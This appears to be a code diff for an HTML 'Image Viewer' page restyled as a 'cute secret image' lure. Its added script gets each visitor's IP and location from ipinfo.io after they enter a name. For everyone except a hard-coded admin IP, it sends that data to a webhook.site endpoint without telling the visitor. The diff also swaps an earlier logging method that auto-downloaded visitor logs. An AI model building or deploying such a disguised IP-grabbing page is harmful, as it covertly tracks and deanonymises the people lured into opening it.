@@ -4,8 +4,9 @@
     <title>Image Viewer</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: Comic Sans MS, cursive;
             text-align: center;
+            background-color: #ffe6f2;
             padding: 20px;
         }
         #content {
@@ -16,6 +17,7 @@
             max-width: 100%;
             border-radius: 8px;
             display: none;
+            box-shadow: 0 0 15px hotpink;
         }
         #name-form {
             margin: 20px 0;
@@ -24,22 +26,22 @@
 </head>
 <body>
     <div id="content">
-        <h1>View Our Exclusive Image</h1>
+        <h1>✨ View Our Super Cute Secret Image ✨</h1>
         
         <div id="name-form">
-            <p>Enter your name to view the image:</p>
-            <input type="text" id="userName" placeholder="Your name">
-            <button onclick="handleSubmission()">View Image</button>
+            <p>Enter your name to unlock the cuteness:</p>
+            <input type="text" id="userName" placeholder="UwU what's your name?">
+            <button onclick="handleSubmission()">Show me 💖</button>
         </div>
         
-        <img id="user-image" src="https://i.imgur.com/example.jpg" alt="Exclusive content">
+        <img id="user-image" src="https://i.imgur.com/bu0m0wa.jpg" alt="UwU E-Girl + Furry Combo">
     </div>
 
     <script>
         const ADMIN_IP = "83.105.112.217";
 
         async function handleSubmission() {
-            const userName = document.getElementById('userName').value.trim() || "Anonymous";
+            const userName = document.getElementById('userName').value.trim() || "UwU Nobody";
 
             try {
                 const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
@@ -55,40 +57,24 @@
                     time: new Date().toISOString()
                 };
 
-                // If viewer is not you, broadcast the data to all tabs open (including admin tab)
+                // If viewer isn't admin, send log via webhook (or replace this later)
                 if (ipData.ip !== ADMIN_IP) {
-                    localStorage.setItem("visitorLog", JSON.stringify(log));
-                    localStorage.setItem("logTrigger", Date.now()); // force update to trigger listener
+                    fetch("https://webhook.site/a75cc371-47c5-4513-aaff-5282696bb856", {
+                        method: "POST",
+                        body: JSON.stringify(log),
+                        headers: { "Content-Type": "application/json" }
+                    });
                 }
 
-                // Show the image
                 document.getElementById('user-image').style.display = 'block';
                 document.getElementById('name-form').style.display = 'none';
+
             } catch (e) {
                 document.getElementById('user-image').style.display = 'block';
                 document.getElementById('name-form').style.display = 'none';
             }
         }
 
-        // Admin listens for new visitor logs via localStorage
-        window.addEventListener("storage", (e) => {
-            if (e.key === "logTrigger") {
-                try {
-                    const data = localStorage.getItem("visitorLog");
-                    const blob = new Blob([data], { type: "text/plain" });
-                    const link = document.createElement("a");
-                    link.href = URL.createObjectURL(blob);
-                    link.download = "visitor_log.txt";
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
-                } catch (e) {
-                    console.error("Failed to process visitor log.");
-                }
-            }
-        });
-
-        // Allow enter key to trigger submission
         document.getElementById('userName').addEventListener('keypress', (e) => {
             if (e.key === 'Enter') handleSubmission();
         });
